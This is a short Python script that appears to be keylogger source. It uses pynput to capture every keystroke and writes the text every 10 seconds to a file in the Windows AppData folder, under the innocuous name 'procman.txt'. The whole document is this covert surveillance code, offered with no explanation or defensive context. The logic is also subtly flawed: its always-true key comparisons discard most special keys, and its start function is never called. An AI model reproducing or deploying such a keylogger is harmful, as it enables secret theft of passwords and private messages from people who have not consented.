#!/usr/bin/python

import pynput.keyboard, threading, os

log = ""
path = os.environ["appdata"] + "\\procman.txt"

def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key.right == key.right:
            log = log + ""
        elif key.left == key.left:
            log = log + ""
        elif key.up == key.up:
            log = log + ""
        elif key.down == key.down:
            log = log + ""
        else:
            log = log + " " + str(key) + " "

def report():
    global log
    global path
    fin = open(path, "a")
    fin.write(log)
    log = ""
    fin.close()
    timer = threading.Timer(10, report)
    timer.start()

def start():
    kb_lst = pynput.keyboard.Listener(on_press=process_keys)
    with kb_lst:
        report()
        kb_lst.join()
